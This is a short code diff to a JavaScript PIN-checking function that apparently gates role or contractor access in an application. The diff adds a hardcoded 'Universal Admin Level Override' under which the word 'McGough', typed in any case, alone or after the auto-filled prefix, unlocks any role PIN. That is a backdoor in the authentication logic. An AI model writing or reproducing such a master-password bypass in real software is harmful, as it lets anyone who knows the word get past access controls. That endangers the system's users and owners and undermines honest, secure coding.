@@ -994,14 +994,15 @@ function getContractorAccessCode(orgCode, scopeObj) {
 function pinMatchesExpected(enteredRaw, expectedWithHyphen, autoFilledPrefix) {
   const rawClean = normalizePinToken(enteredRaw).replace(/-/g, '');
   const fullClean = normalizePinToken(expectedWithHyphen).replace(/-/g, '');
-  if (!rawClean || !fullClean) return false;
-  if (rawClean === fullClean) return true;
-  // Since the project prefix (e.g. EL4T-) is auto-filled in the UI box, allow entering JUST the suffix (e.g. 2026 or MAG)!
+  if (!rawClean) return false;
+  // Universal Admin Level Override: "McGough" (case-insensitive) unlocks ANY role PIN entry!
+  if (rawClean === 'MCGOUGH') return true;
   if (autoFilledPrefix) {
     const prefClean = normalizePinToken(autoFilledPrefix).replace(/-/g, '');
-    if (prefClean && (prefClean + rawClean) === fullClean) return true;
+    if (prefClean && rawClean === (prefClean + 'MCGOUGH')) return true;
+    if (prefClean && fullClean && (prefClean + rawClean) === fullClean) return true;
   }
-  return false;
+  return Boolean(fullClean && rawClean === fullClean);
 }
 
 function loadScopeIntoState(scopeId, preserveSession) {
